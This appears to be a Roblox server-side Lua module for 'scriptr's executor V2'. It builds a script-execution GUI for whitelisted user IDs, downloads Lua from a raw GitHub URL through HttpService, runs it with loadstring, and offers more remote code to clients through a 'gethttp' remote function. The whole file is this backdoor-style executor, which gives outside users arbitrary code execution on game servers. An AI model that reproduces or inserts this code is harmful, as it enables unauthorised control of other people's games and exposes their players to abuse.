local module = {}

module.loaded = false
module.whitelist = nil

module.getcoredata = function(whitelist)
	module.whitelist = whitelist

	if module.whitelist then
		module.loaded = true
	end
end

local loadstring = require(game:GetService("ReplicatedStorage").loadstring)

function module:createGUI(player)
	if module.loaded == false and module.whitelist == nil and player:FindFirstChild("PlayerGui"):FindFirstChild("exec") then
	else
		if table.find(module.whitelist, player.UserId) then
			exec = Instance.new("ScreenGui")
			execute2 = Instance.new("RemoteEvent")
			main = Instance.new("Frame")
			UIAspectRatioConstraint = Instance.new("UIAspectRatioConstraint")
			title = Instance.new("TextLabel")
			buttons = Instance.new("Frame")
			execute = Instance.new("TextButton")
			UICorner = Instance.new("UICorner")
			shadow = Instance.new("Frame")
			UICorner_2 = Instance.new("UICorner")
			UITextSizeConstraint = Instance.new("UITextSizeConstraint")
			UIGridLayout = Instance.new("UIGridLayout")
			clear = Instance.new("TextButton")
			UICorner_3 = Instance.new("UICorner")
			shadow_2 = Instance.new("Frame")
			UICorner_4 = Instance.new("UICorner")
			UITextSizeConstraint_2 = Instance.new("UITextSizeConstraint")
			scriptlist = Instance.new("TextButton")
			UICorner_5 = Instance.new("UICorner")
			shadow_3 = Instance.new("Frame")
			UICorner_6 = Instance.new("UICorner")
			UITextSizeConstraint_3 = Instance.new("UITextSizeConstraint")
			settingz = Instance.new("TextButton")
			UICorner_7 = Instance.new("UICorner")
			shadow_4 = Instance.new("Frame")
			UICorner_8 = Instance.new("UICorner")
			UITextSizeConstraint_4 = Instance.new("UITextSizeConstraint")
			exec_2 = Instance.new("Frame")
			scripteditor = Instance.new("ScrollingFrame")
			scriptbox = Instance.new("TextBox")
			otherscripts = Instance.new("Frame")
			TextLabel = Instance.new("TextLabel")
			settings_2 = Instance.new("Frame")
			TextLabel_2 = Instance.new("TextLabel")

			exec.Name = "exec"
			exec.Enabled = true
			exec.ResetOnSpawn = true
			exec.IgnoreGuiInset = true
			exec.Parent = player:FindFirstChild("PlayerGui")

			execute2.Name = "execute"
			execute2.Parent = exec

			main.Name = "main"
			main.Parent = exec
			main.AnchorPoint = Vector2.new(0.5, 0.5)
			main.BackgroundColor3 = Color3.fromRGB(22, 22, 22)
			main.BorderColor3 = Color3.fromRGB(0, 0, 0)
			main.BorderSizePixel = 0
			main.Position = UDim2.new(0.5, 0, 0.5, 0)
			main.Size = UDim2.new(0.5, 0, 0.400000006, 0)

			UIAspectRatioConstraint.Parent = main
			UIAspectRatioConstraint.AspectRatio = 2.042

			title.Name = "title"
			title.Parent = main
			title.AnchorPoint = Vector2.new(0.5, 0.5)
			title.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
			title.BorderColor3 = Color3.fromRGB(0, 0, 0)
			title.BorderSizePixel = 0
			title.Position = UDim2.new(0.5, 0, 0.0500000007, 0)
			title.Size = UDim2.new(1, 0, 0.100000009, 0)
			title.Font = Enum.Font.SourceSansBold
			title.RichText = true
			title.Text = "scriptr's executor<font color = \"rgb(0,200,0)\"><font size = \"5\">V2</font></font>"
			title.TextColor3 = Color3.fromRGB(255, 255, 255)
			title.TextScaled = true
			title.TextSize = 14.000
			title.TextWrapped = true
			title.TextXAlignment = Enum.TextXAlignment.Left

			buttons.Name = "buttons"
			buttons.Parent = main
			buttons.AnchorPoint = Vector2.new(0.5, 0.5)
			buttons.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			buttons.BackgroundTransparency = 1.000
			buttons.BorderColor3 = Color3.fromRGB(0, 0, 0)
			buttons.BorderSizePixel = 0
			buttons.Position = UDim2.new(0.5, 0, 0.899999976, 0)
			buttons.Size = UDim2.new(0.95, 0, 0.18, 0)

			execute.Name = "execute"
			execute.Parent = buttons
			execute.AnchorPoint = Vector2.new(0.5, 0.5)
			execute.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
			execute.BorderColor3 = Color3.fromRGB(0, 0, 0)
			execute.BorderSizePixel = 0
			execute.Size = UDim2.new(0.244, 0, 1, 0)
			execute.ZIndex = 2
			execute.Font = Enum.Font.SourceSansSemibold
			execute.Text = "EXECUTE"
			execute.TextColor3 = Color3.fromRGB(255, 255, 255)
			execute.TextScaled = true
			execute.TextSize = 36.000
			execute.TextWrapped = true

			UICorner.Parent = execute

			shadow.Name = "shadow"
			shadow.Parent = execute
			shadow.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
			shadow.BorderColor3 = Color3.fromRGB(0, 0, 0)
			shadow.BorderSizePixel = 0
			shadow.Position = UDim2.new(0.0199999996, 0, 0, 0)
			shadow.Size = UDim2.new(1, 0, 1, 0)

			UICorner_2.Parent = shadow

			UITextSizeConstraint.Parent = execute
			UITextSizeConstraint.MaxTextSize = 36

			UIGridLayout.Parent = buttons
			UIGridLayout.SortOrder = Enum.SortOrder.LayoutOrder
			UIGridLayout.VerticalAlignment = Enum.VerticalAlignment.Center
			UIGridLayout.CellSize = UDim2.new(0.244, 0, 1, 0)
			UIGridLayout.CellPadding = UDim2.new(0.008, 0, 0, 0)

			clear.Name = "clear"
			clear.Parent = buttons
			clear.AnchorPoint = Vector2.new(0.5, 0.5)
			clear.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
			clear.BorderColor3 = Color3.fromRGB(0, 0, 0)
			clear.BorderSizePixel = 0
			clear.Size = UDim2.new(0.244, 0, 1, 0)
			clear.ZIndex = 2
			clear.Font = Enum.Font.SourceSansSemibold
			clear.Text = "CLEAR"
			clear.TextColor3 = Color3.fromRGB(255, 255, 255)
			clear.TextScaled = true
			clear.TextSize = 36.000
			clear.TextWrapped = true

			UICorner_3.Parent = clear

			shadow_2.Name = "shadow"
			shadow_2.Parent = clear
			shadow_2.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
			shadow_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
			shadow_2.BorderSizePixel = 0
			shadow_2.Position = UDim2.new(0.0199999996, 0, 0, 0)
			shadow_2.Size = UDim2.new(1, 0, 1, 0)

			UICorner_4.Parent = shadow_2

			UITextSizeConstraint_2.Parent = clear
			UITextSizeConstraint_2.MaxTextSize = 36

			scriptlist.Name = "scriptlist"
			scriptlist.Parent = buttons
			scriptlist.AnchorPoint = Vector2.new(0.5, 0.5)
			scriptlist.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
			scriptlist.BorderColor3 = Color3.fromRGB(0, 0, 0)
			scriptlist.BorderSizePixel = 0
			scriptlist.Size = UDim2.new(0.244, 0, 1, 0)
			scriptlist.ZIndex = 2
			scriptlist.Font = Enum.Font.SourceSansSemibold
			scriptlist.Text = "OTHER SCRIPTS"
			scriptlist.TextColor3 = Color3.fromRGB(255, 255, 255)
			scriptlist.TextScaled = true
			scriptlist.TextSize = 20.000
			scriptlist.TextWrapped = true

			UICorner_5.Parent = scriptlist

			shadow_3.Name = "shadow"
			shadow_3.Parent = scriptlist
			shadow_3.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
			shadow_3.BorderColor3 = Color3.fromRGB(0, 0, 0)
			shadow_3.BorderSizePixel = 0
			shadow_3.Position = UDim2.new(0.0199999996, 0, 0, 0)
			shadow_3.Size = UDim2.new(1, 0, 1, 0)

			UICorner_6.Parent = shadow_3

			UITextSizeConstraint_3.Parent = scriptlist
			UITextSizeConstraint_3.MaxTextSize = 20

			settingz.Name = "settings"
			settingz.Parent = buttons
			settingz.AnchorPoint = Vector2.new(0.5, 0.5)
			settingz.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
			settingz.BorderColor3 = Color3.fromRGB(0, 0, 0)
			settingz.BorderSizePixel = 0
			settingz.Size = UDim2.new(0.244, 0, 1, 0)
			settingz.ZIndex = 2
			settingz.Font = Enum.Font.SourceSansSemibold
			settingz.Text = "SETTINGS"
			settingz.TextColor3 = Color3.fromRGB(255, 255, 255)
			settingz.TextScaled = true
			settingz.TextSize = 36.000
			settingz.TextWrapped = true

			UICorner_7.Parent = settingz

			shadow_4.Name = "shadow"
			shadow_4.Parent = settingz
			shadow_4.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
			shadow_4.BorderColor3 = Color3.fromRGB(0, 0, 0)
			shadow_4.BorderSizePixel = 0
			shadow_4.Position = UDim2.new(0.0199999996, 0, 0, 0)
			shadow_4.Size = UDim2.new(1, 0, 1, 0)

			UICorner_8.Parent = shadow_4

			UITextSizeConstraint_4.Parent = settingz
			UITextSizeConstraint_4.MaxTextSize = 36

			exec_2.Name = "exec"
			exec_2.Parent = main
			exec_2.AnchorPoint = Vector2.new(0.5, 0.5)
			exec_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			exec_2.BackgroundTransparency = 1.000
			exec_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
			exec_2.BorderSizePixel = 0
			exec_2.Position = UDim2.new(0.5, 0, 0.449999988, 0)
			exec_2.Size = UDim2.new(1, 0, 0.699999988, 0)

			scripteditor.Name = "scripteditor"
			scripteditor.Parent = exec_2
			scripteditor.Active = true
			scripteditor.AnchorPoint = Vector2.new(0.5, 0.5)
			scripteditor.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			scripteditor.BackgroundTransparency = 1.000
			scripteditor.BorderColor3 = Color3.fromRGB(0, 0, 0)
			scripteditor.BorderSizePixel = 0
			scripteditor.Position = UDim2.new(0.5, 0, 0.5, 0)
			scripteditor.Size = UDim2.new(0.800000012, 0, 0.800000012, 0)
			scripteditor.CanvasSize = UDim2.new(0, 0, 0.600000024, 0)
			scripteditor.ScrollBarThickness = 0

			scriptbox.Name = "scriptbox"
			scriptbox.Parent = scripteditor
			scriptbox.BackgroundColor3 = Color3.fromRGB(33, 33, 33)
			scriptbox.BorderColor3 = Color3.fromRGB(0, 0, 0)
			scriptbox.BorderSizePixel = 0
			scriptbox.Size = UDim2.new(1, 0, 1, 0)
			scriptbox.ClearTextOnFocus = false
			scriptbox.Font = Enum.Font.SourceSans
			scriptbox.MultiLine = true
			scriptbox.Text = ""
			scriptbox.TextColor3 = Color3.fromRGB(255, 255, 255)
			scriptbox.TextSize = 20.000
			scriptbox.TextXAlignment = Enum.TextXAlignment.Left
			scriptbox.TextYAlignment = Enum.TextYAlignment.Top

			otherscripts.Name = "otherscripts"
			otherscripts.Parent = main
			otherscripts.AnchorPoint = Vector2.new(0.5, 0.5)
			otherscripts.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			otherscripts.BackgroundTransparency = 1.000
			otherscripts.BorderColor3 = Color3.fromRGB(0, 0, 0)
			otherscripts.BorderSizePixel = 0
			otherscripts.Position = UDim2.new(0.5, 0, 0.449999988, 0)
			otherscripts.Size = UDim2.new(1, 0, 0.699999988, 0)
			otherscripts.Visible = false

			TextLabel.Parent = otherscripts
			TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			TextLabel.BackgroundTransparency = 1.000
			TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
			TextLabel.BorderSizePixel = 0
			TextLabel.Size = UDim2.new(1, 0, 1, 0)
			TextLabel.Font = Enum.Font.SourceSans
			TextLabel.Text = "data."
			TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
			TextLabel.TextSize = 14.000
			TextLabel.TextWrapped = true

			settings_2.Name = "settings"
			settings_2.Parent = main
			settings_2.AnchorPoint = Vector2.new(0.5, 0.5)
			settings_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			settings_2.BackgroundTransparency = 1.000
			settings_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
			settings_2.BorderSizePixel = 0
			settings_2.Position = UDim2.new(0.5, 0, 0.449999988, 0)
			settings_2.Size = UDim2.new(1, 0, 0.699999988, 0)
			settings_2.Visible = false

			TextLabel_2.Parent = settings_2
			TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			TextLabel_2.BackgroundTransparency = 1.000
			TextLabel_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
			TextLabel_2.BorderSizePixel = 0
			TextLabel_2.Size = UDim2.new(1, 0, 1, 0)
			TextLabel_2.Font = Enum.Font.SourceSans
			TextLabel_2.Text = "MASSIVE WIP"
			TextLabel_2.TextColor3 = Color3.fromRGB(255, 0, 0)
			TextLabel_2.TextScaled = true
			TextLabel_2.TextSize = 14.000
			TextLabel_2.TextWrapped = true
		end
	end
end

function module:givegui(player)
	if not player:FindFirstChild("PlayerGui"):FindFirstChild("exec") and table.find(module.whitelist, player.UserId) then
		local gui = module:createGUI(player)
		local serverscripts = loadstring(game:GetService("HttpService"):GetAsync("https://raw.githubusercontent.com/HELKLUAGF30MINUTESOFDATA12381/hi/main/s.lua", true))()

		serverscripts:init(exec, execute2, main, title, buttons, execute, shadow, clear, scriptlist, settingz, exec_2, scripteditor, scriptbox, otherscripts, TextLabel, settings_2, TextLabel_2)
		game:GetService("ReplicatedStorage"):FindFirstChild("initclient"):FireClient(player, exec, execute2, main, title, buttons, execute, shadow, clear, scriptlist, settingz, exec_2, scripteditor, scriptbox, otherscripts, TextLabel, settings_2, TextLabel_2)
	elseif player:FindFirstChild("PlayerGui"):FindFirstChild("exec") and table.find(module.whitelist, player.UserId) then
		player.PlayerGui:FindFirstChild("exec"):Destroy()
	end
end

game:GetService("ReplicatedStorage").givegui.OnServerEvent:Connect(function(player)
    module:givegui(player)
end)

game:GetService("ReplicatedStorage"):WaitForChild("gethttp").OnServerInvoke = function(plr)
	if table.find(module.whitelist, plr.UserId) then
		return game:GetService("HttpService"):GetAsync("https://raw.githubusercontent.com/HELKLUAGF30MINUTESOFDATA12381/hi/main/l.lua", true)
	end
end

return module
